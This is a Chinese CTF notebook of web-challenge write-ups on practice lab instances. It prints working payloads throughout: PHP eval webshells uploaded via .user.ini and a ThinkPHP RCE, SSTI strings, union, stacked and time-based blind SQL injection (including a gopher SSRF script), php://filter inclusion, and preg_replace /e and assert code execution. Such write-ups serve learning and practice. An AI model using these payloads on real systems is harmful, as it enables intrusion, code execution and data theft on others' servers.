            $val==="DGGJ"?die("no......"):NULL;
        }
        $key2 = 1;
    }else{
        die("no hack");
    }
}else{
    die("no");
}

if($key1 && $key2){
    include "Hgfks.php";
    echo "You're right"."\n";
    echo $flag;
}
```



发现需要构造a和b和c

构造a就要用e了，注意url传递字符串不用“”

b的话用一个python脚本便可以构造成功（问就是撞库）

```python
import hashlib

target_suffix = "8b184b"

# 循环生成字符串并计算哈希值
i = 0
while True:
    # 构造字符串
    string = str(i)
    # 计算哈希值
    hash_value = hashlib.md5(string.encode()).hexdigest()
    # 提取哈希值的后六位
    suffix = hash_value[-6:]
    # 检查是否符合条件
    if suffix == target_suffix:
        break
    i += 1

print("生成的字符串:", string)
print("对应的哈希值:", hash_value)
```

c的话就是一个json序列化问题

然后关键在于array_search()比较为==问题，用0和"DGGJ"比较就可

最后的payload

http://61.147.171.105:56575/?a=1e8&b=53724&c={%22m%22:%222023a%22,%22n%22:[[1,2],0]}

大概是一个tornado的模板注入（这里也看了下答案）

先看/flag.txt告诉你目标文件

![image-20230831152616496](./assets/image-20230831152616496.png)

主要的关键感觉就在于

http://61.147.171.105:53911/error?msg=这里会对模型进行一个渲染（挺amazing的）

输入这个http://61.147.171.105:53911/error?msg={{handler.settings}}即可获得secret的值，即可进行加密获取flag对应的hash值（如果没这么简单的话感觉可能要想办法读源码）

感觉作为一道难度为1的题目，难度远超于1了:worried:

首先打开这个界面发现会对文件的类型进行检验

然后查到相关的资料（前置知识）

.htaccess文件是用于apache服务器下的控制文件访问的配置文件，因此Nginx下是不会生效的

一般.htaccess可以用来留后门和针对黑名单绕过

　　创建一个txt写入

　　 AddType application/x-httpd-php .png   （这个配置信息的意思是把.png文件当成php文件解析）

　　打开另存为

　　保存类型为所有文件

　　让 png 解析为 php 

　　还可以把png改成其他图片格式~例如jpeg、gif等等...

　　另外，还有一个知识~（此题没用到这部分知识）

　　可以在.htaccess 加入php解析规则

　　类似于把文件名包含1的解析成php

　　<FilesMatch "1">

　　SetHandler application/x-httpd-php

　　</FilesMatch>

　　1.png 就会以php执行

然后查到这道题可以利用.user.ini文件（.user.ini文件为比较常用的配置文件）

在服务器中，只要是运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。
这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini，并作为cgi的启动项。
其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制

有2个属性，它们的作用是，`auto_append_file`在`php`文件最后用`require`包含进指定文件，`auto_prepend_file`则是在`php`文件代码执行前用`require`包含进指定的文件

解题：编辑.user.ini文件如下

GIF89a
auto_prepend_file=a.jpg   它告诉服务器在每个 PHP 文件之前自动包含名为 `a.jpg` 的文件。这个文件可以是一个 PHP 脚本或其他类型的文件。它的作用是在 PHP 文件执行之前自动执行指定的代码，例如设置全局变量或加载自定义函数库。

上传.user.ini文件（注意用BurpSuite抓包修改文件类型为image/jpg）

然后编辑a.txt

如下：

GIF89a
<?=eval($_REQUEST['cmd']);?>

然后即可用蚁剑抓包获取flag







先进去然后发现只有登录框，后来去审计js文件发现华夏

想到华夏exp

大概就是审计第一个发现在白名单中就不会再管了

aa.css在白名单中

直接构造payload

/aa.css/…/flag.html

打ctf后最不相信的就是easy这个词了

先获取到源码

```php
<?php
highlight_file(__FILE__);
$url = 'http://back-end:3000/flag?';
$input = file_get_contents('php://input');      //获取输入流数据
$headers = (array)json_decode($input)->headers;
for($i = 0; $i < count($headers); $i++){
    $offset = stripos($headers[$i], ':');           //key用来获取headers
    $key = substr($headers[$i], 0, $offset);		//value用来获取对应headers的值
    $value = substr($headers[$i], $offset + 1);
    if(stripos($key, 'admin') > -1 && stripos($value, 'true') > -1){
        die('try hard');
    }
}
$params = (array)json_decode($input)->params;
$url .= http_build_query($params);
$url .= '&admin=false';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_TIMEOUT_MS, 5000);
curl_setopt($ch, CURLOPT_NOBODY, FALSE);
$result = curl_exec($ch);
curl_close($ch);
echo $result;
```

然后又附一个app.js

```javascript
const express = require('express');

const app = express();

const port = 3000;
const flag = process.env.flag;

app.get('/flag', (req, res) => {
    if(!req.query.admin.includes('false') && req.headers.admin.includes('true')){
        res.send(flag);
    }else{
        res.send('try hard');
    }
});

app.listen({ port: port , host: '0.0.0.0'});

```

这里的话大概就是

先看一下php代码，有一个file_get_contents('php://input')，这是一个文件包含，当Content-Type为application/x-www-form-urlencoded且提交方法是POST方法时，$_POST数据与php://input数据是一致的。

然后会`$headers = (array)json_decode($input)->headers把post过去的数据解码成数组，很明显post的内容就是http请求里的headers，写post数据的时候要写成json的形式。像这样：

当我们传入的参数超过1000个时，之后的参数会被舍弃掉。于是这里我们最开始发个"admin":"t"设置好admin的值，加上999个没用的参数，把程序拼接的&admin=false挤掉，即可绕过过滤。

```php
有几个判断
    第一个就是 if(!req.query.admin.includes('false') && req.headers.admin.includes('true'))
        要求admin后面的查询参数不包含false 并且admin的请求头部包含true
第二个是
        stripos($key, 'admin') > -1 && stripos($value, 'true') > -1)
```



网鼎杯的难题（web的东西还是好多好杂）!!!下次还是要看过题解后自己再从头来一遍

首先发现sql注入点（找到的思路但是不会自己注入）

http://61.147.171.105:49452/view.php?no=1 order by 5 --+ 报错

然后http://61.147.171.105:49452/view.php?no=1 order by 4 --+ 没有报错 确定有四列

然后试试union  http://61.147.171.105:49452/view.php?no=1 union select 1,2,3,4 --+

发现no hack

测试后发现是内联绕过  http://61.147.171.105:49452/view.php?no=1 union/**/ select 1,2,3,4 --+

http://61.147.171.105:49452/view.php?no=-1 union/**/ select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()#

 http://61.147.171.105:49452/view.php?no=-1 union/**/ select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'#

然后获取data列的值

 http://61.147.171.105:49452/view.php?no = 100 union /**/ select group_concat(data),3,4 from users #

![image-20230804230400294](./assets/image-20230804230400294.png)

发现是这样存储数据的

然后扫目录的时候发现有robots.txt文件打开如下

![image-20230804230513740](./assets/image-20230804230513740.png)

获取/user.php.bak

发现源码如下

```php
<?php


class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```

同时发现自己的data是通过反序列化的形式存储的

构造需要的反序列化

UserInfo":3:{s:4:"name";s:4:"assasda";s:3:"age";i:0;s:4:"blog";s:43:"file:///var/www/html/flag.php";}

序列化是将一个对象转化为可存储或可传输的格式的过程。在php中，可以使用serialize()函数将一个对象序列化为字符串，然后使用unserialize（）函数将字符串反序列化为对象

传递上去：

可以用serialize构造序列化

http://61.147.171.105:49452/view.php?no=100 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'

然后看源码发现 <iframe width='100%' height='10em' src='data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3tjMWU1NTJmZGY3NzA0OWZhYmY2NTE2OGYyMmY3YWVhYn0iOw0KZXhpdCgwKTsNCg=='>

base64解码后得到

<?php

$flag = "flag{c1e552fdf77049fabf65168f22f7aeab}";
exit(0);

第二种解法：直接用load__file读取

view-source:http://61.147.171.105:49452/view.php?no=100%20union/**/select%201,load_file(%27/var/www/html/flag.php%27),3,4%20

![image-20230804232938177](./assets/image-20230804232938177.png)

即可读取成功

真的好奇怪，我的php://input无论是在靶机还是在本机上都没办法实现

最后用data传递协议

http://61.147.171.105:56400?file1=php://filter/read=convert.base64-encode/resource=flag.php&file2=data://text/plain,hello ctf

base64解码后得到flag

总结一下：感觉可能是google上的hackbar发post包的时候有问题（找到问题是只能以键值形式发送），然后在firefox上下了max hackbar（感觉效果挺好）还可以配合bp截获包

挺简单的一道题，

```php
<?php
if( !ini_get('display_errors') ) {
  ini_set('display_errors', 'On');
  }
error_reporting(E_ALL);
$lan = $_COOKIE['language'];
if(!$lan)
{
	@setcookie("language","english");
	@include("english.php");
}
else
{
	@include($lan.".php");
}
$x=file_get_contents('index.php');
echo $x;
?>
```

发现把cookie设置为flag即可返回正确答案，关键在于用php：//filter绕过一下

Cookie:language=php://filter/read=convert.base64-encode/resource=flag

感觉关键点就两个：

1.cookie传递的方式（bp包里面这样）

2.学会用php://filter而不是最简单的读取

发现文件包含漏洞，然后用dirsearch直接扫到发现该目录下有flag.php目标文件，于是目标就一直放在如何读取这个文件下：

尝试普通的filename=php://filter/resource发现没有返回值 这时选取了默认的过滤器，会将敏感信息过滤

然后修改过滤器的种类发现成功读取http://61.147.171.105:51570/?filename=php://filter/convert.iconv.utf8.utf16/resource=flag.php

好难的题目（:sob:）

怎么现在题目都这么难了

先用dirsearch扫目录

获取到有用信息，有一个/admin.php和/login.php这里的admin.php是用来管理员登录的

/login.php下有一个提示

|                                         |
| --------------------------------------- |
| <!-- TODO: Remove ?debug-Parameter! --> |
|                                         |

根据常规经验，这样的URL结构中的“debug”参数通常用于开发和调试目的。它可能用于在网站或应用程序的代码中启用调试模式，以便开发人员可以查看更详细的错误信息、调试输出或其他相关信息，以帮助识别和解决问题。

然后后面加入?debug可以获取源码

```php
<?php
if(isset($_POST['usr']) && isset($_POST['pw'])){
        $user = $_POST['usr'];
        $pass = $_POST['pw'];

        $db = new SQLite3('../fancy.db');
        
        $res = $db->query("SELECT id,name from Users where name='".$user."' and password='".sha1($pass."Salz!")."'");
    if($res){
        $row = $res->fetchArray();
    }
    else{
        echo "<br>Some Error occourred!";
    }

    if(isset($row['id'])){
            setcookie('name',' '.$row['name'], time() + 60, '/');
            header("Location: /");
            die();
    }

}

if(isset($_GET['debug']))
highlight_file('login.php');
?>
```

可以看出这里的数据库为SQLite3，user里面可以注入（这里的输出是用cookie的形式输出的）所以建议用bp抓包查看输出

抄的注入语句

```php
1' union select name,sql from sqlite_master --+
1' union select id,group_concat(id) from users--+得到1，2，3

1' union select id,group_concat(name) from users--+得到admin,fritze,hansi

1' union select id,group_concat(password) from users--+得到3fab54a50e770d830c0416df817567662a9dc85c、54eae8935c90f467427f05e4ece82cf569f89507、34b0bb7c304949f9ff2fc101eef0f048be10d3bd

```



获得表如下

![在这里插入图片描述](./assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70.png)

这里的意思是找到最喜欢的word然后+Salz!后的sha1编码跟 3fab54a50e770d830c0416df817567662a9dc85c 相等

发现直接md5解密就得到密码（感觉是非预期解了）

ThinJerboaSalz!

正确的解法应该是从pdf文件中找对应的值然后求


真建议这种简单题多来一点让我重拾对web的希望

直接hackbar一键解决

感觉不是很难的一道题，我都做出来了，骄傲:smile:

一阵乱点后发现了奥秘

http://61.147.171.105:60385/index.php?page=index

这里看到可能有文件包含漏洞尝试：

http://61.147.171.105:60385/index.php?page=../../../../../etc/passwd

发现确实存在

![image-20230830172009213](./assets/image-20230830172009213.png)

然后用php://filter/read=convert.base64-encode/resource=index.php读源码

base64解密后即可得到源码

```php
<?php
error_reporting(0);

@session_start();
posix_setuid(1000);


?>
<!DOCTYPE HTML>
<html>

<head>
    <meta charset="utf-8">
    <meta name="renderer" content="webkit">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" href="layui/css/layui.css" media="all">
    <title>设备维护中心</title>
    <meta charset="utf-8">
</head>

<body>
    <ul class="layui-nav">
        <li class="layui-nav-item layui-this"><a href="?page=index">云平台设备维护中心</a></li>
    </ul>
    <fieldset class="layui-elem-field layui-field-title" style="margin-top: 30px;">
        <legend>设备列表</legend>
    </fieldset>
    <table class="layui-hide" id="test"></table>
    <script type="text/html" id="switchTpl">
        <!-- 这里的 checked 的状态只是演示 -->
        <input type="checkbox" name="sex" value="{{d.id}}" lay-skin="switch" lay-text="开|关" lay-filter="checkDemo" {{ d.id==1 0003 ? 'checked' : '' }}>
    </script>
    <script src="layui/layui.js" charset="utf-8"></script>
    <script>
    layui.use('table', function() {
        var table = layui.table,
            form = layui.form;

        table.render({
            elem: '#test',
            url: '/somrthing.json',
            cellMinWidth: 80,
            cols: [
                [
                    { type: 'numbers' },
                     { type: 'checkbox' },
                     { field: 'id', title: 'ID', width: 100, unresize: true, sort: true },
                     { field: 'name', title: '设备名', templet: '#nameTpl' },
                     { field: 'area', title: '区域' },
                     { field: 'status', title: '维护状态', minWidth: 120, sort: true },
                     { field: 'check', title: '设备开关', width: 85, templet: '#switchTpl', unresize: true }
                ]
            ],
            page: true
        });
    });
    </script>
    <script>
    layui.use('element', function() {
        var element = layui.element; //导航的hover效果、二级菜单等功能，需要依赖element模块
        //监听导航点击
        element.on('nav(demo)', function(elem) {
            //console.log(elem)
            layer.msg(elem.text());
        });
    });
    </script>

<?php

$page = $_GET[page];

if (isset($page)) {



if (ctype_alnum($page)) {
?>

    <br /><br /><br /><br />
    <div style="text-align:center">
        <p class="lead"><?php echo $page; die();?></p>
    <br /><br /><br /><br />

<?php

}else{

?>
        <br /><br /><br /><br />
        <div style="text-align:center">
            <p class="lead">
                <?php

                if (strpos($page, 'input') > 0) {
                    die();
                }

                if (strpos($page, 'ta:text') > 0) {
                    die();
                }

                if (strpos($page, 'text') > 0) {
                    die();
                }

                if ($page === 'index.php') {
                    die('Ok');
                }
                    include($page);
                    die();
                ?>
        </p>
        <br /><br /><br /><br />

<?php
}}


//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试

if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {

    echo "<br >Welcome My Admin ! <br >";

    $pattern = $_GET[pat];
    $replacement = $_GET[rep];
    $subject = $_GET[sub];

    if (isset($pattern) && isset($replacement) && isset($subject)) {
        preg_replace($pattern, $replacement, $subject);
    }else{
        die();
    }

}





?>

</body>

</html>

```

发现先要伪造xff：X-Forwarded-For:127.0.0.1

然后再利用preg_replace的一个命令执行漏洞

/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码(在适当的逆向引用替换完之后)。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。

然后开始找php命令（找的好痛苦）

最后用bp发包获取flag

最后的包内容（bp中发包要改头部记好用url编码（空格为%20））

```php
GET /index.php?pat=/233/e&rep=show_source("/var/www/html/s3chahahaDir/flag/flag.php");&sub=233 HTTP/1.1
Host: 61.147.171.105:60385
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
X-Forwarded-For:127.0.0.1
Cookie: PHPSESSID=q6ikiql3tr12m5rk539i277sr5
Connection: close


```

即可获取最后的flag

http://61.147.171.105:58844/?id=1' union select user, pw from cyber --+

感觉没有什么指示就让输ID，算了凑一个20题吧

挺有意思的题目，可惜看题解了呜呜呜

先发现源码中的js中有关于买彩票的部分

```php
$same_count = 0;
	for($i=0; $i<7; $i++){
		if($numbers[$i] == $win_numbers[$i]){
			$same_count++;
		}
	}
	switch ($same_count) {
		case 2:
			$prize = 5;
			break;
		case 3:
			$prize = 20;
			break;
		case 4:
			$prize = 300;
			break;
		case 5:
			$prize = 1800;
			break;
		case 6:
			$prize = 200000;
			break;
		case 7:
			$prize = 5000000;
			break;
		default:
			$prize = 0;
			break;
```

弱类型判断，直接抓包修改即可

POST /api.php HTTP/1.1
Host: 61.147.171.105:53906
Content-Length: 63
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Content-Type: application/json
Origin: http://61.147.171.105:53906
Referer: http://61.147.171.105:53906/buy.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=0d5f78683b61ba49ce4a04e7d5f66314
Connection: close

{"action":"buy","numbers":[true,true,true,true,true,true,true]}

可以获取足够的钱来买flag

感觉挺奇怪的题，先用githack找到源码（flag.php没有代码）哪有这么简单

然后看index.php 发现

```php
<?php

if (isset($_GET['page'])) {
	$page = $_GET['page'];
} else {
	$page = "home";
}

$file = "templates/" . $page . ".php";

// I heard '..' is dangerous!
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");

// TODO: Make this look nice
assert("file_exists('$file')") or die("That file doesn't exist!");

?>

```



然后可以构造？page=abc','..') or var_dump(file_get_contents("templates/flag.php"));//即可

奇怪的环境（也不想多待）

用)封闭strpos  ssert()函数，会将里面的字符串当作php代码执行，返回的结果是True或者False

Bool or Bool 语句，若前面为False，则执行后面的语句，为Ture则不执行后面的语句

strpos()函数，返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。

这题有点东西，先页面什么都没有出现，然后开扫（没思路就开扫），后面发现有一个index.phps文件

phps 文件就是 php 的源代码文件，通常用于提供给用户（访问者）查看 php 代码，因为用 户无法直接通过 Web 浏览器看到 php 文件的来内容，所以需要用 phps 文件代替。其实，只 要不用 php 等已经在服务器中注册过的 MIME 类型为文件即可，但为源了国际通用，所以才 用了 phps 文件类型。

然后用index.php传admin二次url编码后的即可

19年爆的thinkphp rce现在竟然被用了（感觉学到了前线的感觉）

先写payload（网上直接搜索到了现成的payload）

http://61.147.171.105:60269/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo '<?php @eval($_POST["code"]);?>' > 1.php   

然后用蚁剑链接http://61.147.171.105:60269/1.php

找到flag即可

漏洞成因分析

介绍一下Robots协议吧：

Robots协议，也称为爬虫协议、机器人协议等，其全称为“网络爬虫排除标准（Robots Exclusion Protocol）”。网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。也既是Robots的用法有两种，一种是告诉搜索引擎哪些页面你不能抓（默认其他的就可以抓）；一种是告诉搜索引擎你只能抓取哪些页面（默认其他的不可以抓）。

User-agent:*

*是一个通配符，表示所有的搜索引擎种类

Disallow:/admin/

这表示禁止搜索引擎爬寻admin目录下的内容

Disallow:*?*

这表示禁止搜索引擎爬寻包含?的网页

Sitemap:sitemap.xml

这里通过Sitemap指定固定的网站地图页面。目前对此表示支持的搜索引擎公司有Google, Yahoo, Ask and MSN。而中文搜索引擎公司，显然不在这个圈子内。这样做的好处就是，站长不用到每个搜索引擎的站长工具或者相似的站长部分，去提交自己的sitemap文件，搜索引擎的蜘蛛自己就会抓取robots.txt文件，读取其中的sitemap路径，接着抓取其中相链接的网页。

大概就是一个ssti注入（不过这个甚至过滤了“()”）

先获取源码

```python
import flask
import os

app = flask.Flask(__name__)

app.config['FLAG'] = os.environ.pop('FLAG')


@app.route('/')
def index():
    return open(__file__).read()


@app.route('/shrine/<path:shrine>')
def shrine(shrine):

    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s

    return flask.render_template_string(safe_jinja(shrine))


if __name__ == '__main__':
    app.run(debug=True)

```

然后{{get_flashed_messages.__globals__['current_app'].config['FLAG']}}即可获取flag

这里总结一下python中的常见类

```python
__class__          类的一个内置属性，表示实例对象的类。
__base__ 			类型对象的直接基类
__bases__			类型对象的全部基类，以元组形式，类型的实例通常没有属性
__mro__				此属性是由类组成的元组，在方法解析期间会基于它来查找基类
__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.
__init__             初始化类，返回的类型是function
__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。
__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里
__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')
__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。
__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]
__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。
url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}
current_app          应用上下文，一个全局变量。

request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\self\fd/3').read()
request.args.x1   	 get传参
request.values.x1 	 所有参数
request.cookies      cookies参数
request.headers      请求头参数
request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
request.data  		 post传参	(Content-Type:a/b)
request.json		 post传json  (Content-Type: application/json)
config               当前application的所有配置。此外，也可以这样{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
g                    {{g}}得到<flask.g of 'flask_ssti'>

```



貌似很简单的一道题给自己搞麻烦了（可能状态也不是很好吧）

```javascript


<html>
<head>
    <title>JS</title>
    <script type="text/javascript">
    function dechiffre(pass_enc){
        var pass = "70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65";
        var tab  = pass_enc.split(','); //tab为输入的分隔
                var tab2 = pass.split(',');
        var i,j,k,l=0,m,n,o,p = "";
        i = 0;j = tab.length; //j=18
                        k = j + (l) + (n=0); //k=19
                        n = tab2.length;
                        for(i = (o=0); i < (k = j = n); i++ )
                        {o = tab[i-l];
                              p += String.fromCharCode((o = tab2[i]));
                                if(i == 5)break;}
                        for(i = (o=0); i < (k = j = n); i++ ){
                        o = tab[i-l];
                                if(i > 5 && i < k-1)
                                        p += String.fromCharCode((o = tab2[i]));
                        }
        p += String.fromCharCode(tab2[17]);
        pass = p;return pass;
    }
    String["fromCharCode"](dechiffre("\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"));

    h = window.prompt('Enter password');
    alert( dechiffre(h) );

</script>
</head>

</html>

```

然后直接把"\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"转回去即可得到flag

只能说：sql注入之路道阻且长：

开始试了一下普通的sql注入中的union注入、盲注都不行：

于是查看题解了；发现是堆叠注入；

输入下列指令查看sql数据库名：

```sql
1'; show databases;#
```

注意1后面要有',把这个语句闭合后可以输入新的语句（stack injection）

然后发现有过滤return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);

过滤了select 、update、delete、drop、insert、where

于是可以用rename、和alter语句来搞事：

```sql
1';rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#
```



考察序列化+waf绕过（感觉ctf从0开始确实好累啊）

首先看源码发现是反序列化绕过，于是可以伪造命令

```php
<?php

class ease{
    
    private $method;
    private $args;
    function __construct($method, $args) {
        $this->method = $method;
        $this->args = $args;
    }
 
    
   
}
$a = new ease("ping",array('dir'));
$data = base64_encode(serialize($a));
echo($data);
?>
```

然后发现目录下有一个flag_1s_here的文件夹

更换pyload

```php
$a = new ease("ping",array('dir${IFS}fl""ag_1s_here'));
```

发现文件夹下有目标php文件

然后可以读取

```php
$a = new ease("ping",array('ca""t${IFS}`find`'));
```

注意这题waf连空格都过滤

好难的一道题（利用回显进行sql注入）

```
1. 库名
file_name' +(selselectect conv(substr(hex(database()),1,12),16,10))+ '.jpg
# 得到库名：web_upload

2. 表名
file_name'+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema = 'web_upload' limit 1,1)),1,12),16,10))+'.jpg
# 得到表名：hello_flag_is_here

3. 字段
file_name'+(seleselectct+conv(substr(hex((selselectect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = 'hello_flag_is_here' limit 1,1)),1,12),16,10))+'.jpg
# 得到字段名：i_am_flag

4. 获得数据
file_name'+(seleselectct+CONV(substr(hex((seselectlect i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+'.jpg
# 得到flag：!!_@m_Th.e_F!lag
```

还是上传手法不娴熟

就简单的写一个一句话php木马，然后上传用burpsuit抓包修改文件类型为php类型，然后服务器会自动解析为php文件就可直接用蚁剑连接获取webshell了



主页没有回显，只有一句话：

**you are not an inner user, so we can not let you have identify~**.意思是需要以本地用户访问。这里又没有rce、越权、文件包含等。那么很有可能有ssrf。

gopher协议和ssrf联合使用

> gopher协议是一种信息查找系统，他将Internet上的文件组织成某种索引，方便用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。利用此协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp等等，也可以发送 GET、POST 请求。这拓宽了 SSRF 的攻击面

利用:
攻击内网的 Redis、Mysql、FastCGI、Ftp等等，也可以发送 GET、POST 请求
发送GET请求和POST请求
我们现在最多看到使用这个协议的时候都是在去ssrf打redis shell、读mysql数据的时候

- **gopher协议的格式：gopher://IP:port/_TCP/IP数据流**
- GET请求:
  构造HTTP数据包,URL编码、替换回车换行为%0d%0a，HTTP包最后加%0d%0a代表消息结束
- POST请求
  POST与GET传参的区别：它有4个参数为必要参数
  需要传递Content-Type,Content-Length,host,post的参数
  Content-Length和POST的参数长度必须一致

先用一个脚本试试

```python
import urllib.parse

host = "127.0.0.1:80"
content = "uname=admin&passwd=admin"
content_length = len(content)

payload =\
"""POST /index.php HTTP/1.1
Host: {}
User-Agent: curl/7.43.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: {}

{}
""".format(host,content_length,content)

tmp = urllib.parse.quote(payload) #对payload中的特殊字符进行编码
new = tmp.replace('%0A','%0D%0A') #CRLF(换行)漏洞
result = 'gopher://127.0.0.1:80/'+'_'+new
result = urllib.parse.quote(result)# 对新增的部分继续编码
print(result)

```

然后可以用cookie注入

```python
import urllib.parse
import requests
import time
import base64

host = "127.0.0.1:80"
content = "uname=admin&passwd=admin"
content_length = len(content)

payload =\
"""GET /index.php HTTP/1.1
Host: localhost:80
Connection: close
Content-Type: application/x-www-form-urlencoded
Cookie: this_is_your_cookie"""

tmp = urllib.parse.quote(payload) #对payload中的特殊字符进行编码
new = tmp.replace('%0A','%0D%0A') #CRLF(换行)漏洞
result = 'gopher://127.0.0.1:80/'+'_'+new+"="
result = urllib.parse.quote(result)# 对新增的部分继续编码
print(result)

url="http://61.147.171.105:60622/use.php?url="
flag=""
for pos in range(1,50):
    for i in range(33,127):
        #poc="') union select 1,2,if(1=1,sleep(5),1) # "

        #security
        #poc="') union select 1,2,if(ascii( substr((database()),"+str(pos)+",1) )="+str(i)+",sleep(2),1) # "

        #flag
        #poc="') union select 1,2,if(ascii( substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),"+str(pos)+",1) )="+str(i)+",sleep(2),1) # "
        
        poc="') union select 1,2,if(ascii( substr((select * from flag),"+str(pos)+",1) )="+str(i)+",sleep(2),1) # "
        
        bs = str(base64.b64encode(poc.encode("utf-8")), "utf-8")
        final_poc=result+bs+"%3B%250d%250a"
        t1=time.time()
        res=requests.get(url+final_poc)
        t2=time.time()
        if(t2-t1>2):
            flag+=chr(i)
            print(flag)
            break
print(flag)
```

太难了感觉不会



只能说，看错了顺序的笨蛋

```python
import base64
import codecs

miwen = 'a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws'
flag1 = codecs.decode(miwen, 'rot13')
reversed_str = flag1[::-1]
flag2 = base64.b64decode(reversed_str)
flag3 = flag2.decode('utf-8')
flag4 = ''
for s in flag3:
    ascii_value = ord(s)
    new_ascii_value = ascii_value - 1
    flag4 += chr(new_ascii_value)
true_flag = flag4[::-1]
print(true_flag)
```



感觉变蠢了（自己），下次多想想

